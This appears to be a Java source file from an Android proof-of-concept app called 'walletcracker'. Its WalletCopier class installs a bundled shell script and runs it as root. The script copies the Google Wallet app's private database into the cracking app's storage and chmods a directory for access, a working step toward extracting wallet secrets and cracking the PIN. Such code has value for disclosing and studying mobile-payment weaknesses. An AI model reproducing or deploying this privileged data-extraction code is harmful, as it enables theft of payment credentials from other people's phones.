package com.rubixconsulting.walletcracker;

import java.io.File;
import java.io.FileDescriptor;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;

import com.zvelo.walletcracker.R;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.util.Log;

public final class WalletCopier extends ExecuteAsRootBase {
  protected final String TAG = this.getClass().getSimpleName();
  protected Context context;

  public WalletCopier(Context context) {
    this.context = context;
  }

  protected String getWalletDataDir() {
    final PackageManager pm = context.getPackageManager();
    final ApplicationInfo walletInfo;

    try {
      walletInfo = pm.getApplicationInfo(context.getString(R.string.package_google_wallet), PackageManager.GET_META_DATA);
    } catch (NameNotFoundException e) {
      return null;
    }

    Log.d(TAG, "found wallet data dir: " + walletInfo.dataDir);

    return walletInfo.dataDir;
  }

  private void copyFile(InputStream in, FileDescriptor out) {
    try {
      FileWriter rootcopy_out = new FileWriter(out);

      int c;
      while ((c = in.read()) != -1) {
        rootcopy_out.write(c);
      }

      in.close();
      rootcopy_out.close();
    } catch (IOException e) {
      Log.e(TAG, "io error: "+e.getMessage());
    }
  }

  private void installShellScripts() {
    Log.d(TAG, "installing shell scripts");
    try {
      InputStream rootcopy_in = context.getResources().openRawResource(R.raw.rootcopy);
      FileDescriptor rootcopy_out = context.openFileOutput(context.getString(R.string.script_rootcopy), Context.MODE_PRIVATE).getFD();
      copyFile(rootcopy_in, rootcopy_out);
    } catch (FileNotFoundException e) {
     Log.e(TAG, "file not found: "+e.getMessage());
    } catch (IOException e) {
      Log.e(TAG, "io error: "+e.getMessage());
    }
  }

  private void createDatabasesDir() {
    String dbPath = context.getDatabasePath("TEST").getAbsolutePath();
    dbPath = dbPath.substring(0, dbPath.length()-4);
    Log.d(TAG, "making database directory: "+dbPath);
    new File(dbPath).mkdir();

    try {
      Runtime.getRuntime().exec("chmod 771 "+dbPath);
    } catch (IOException e) {
      Log.e(TAG, "Error changing database directory permissions");
    }
  }

  @Override protected ArrayList<String> getCommandsToExecute() {
    ArrayList<String> commands = new ArrayList<String>();

    installShellScripts();
    createDatabasesDir();

    final String copyScript = context.getFileStreamPath(context.getString(R.string.script_rootcopy)).getAbsolutePath();
    final String walletDB = getWalletDataDir() + context.getString(R.string.wallet_db_path);
    final String dbPath = context.getDatabasePath(context.getString(R.string.db_name)).getAbsolutePath();
    final Integer uid;

    try {
      uid = context.getPackageManager().getApplicationInfo(context.getPackageName(), PackageManager.GET_META_DATA).uid;
    } catch (NameNotFoundException e) {
      Log.e(TAG, "could not find myself!");
      return null;
    }

    final String command = "sh " + copyScript + " " + walletDB + " " + dbPath + " " + uid;
    Log.d(TAG, "running as root: "+command);
    commands.add(command);

    return commands;
  }
}
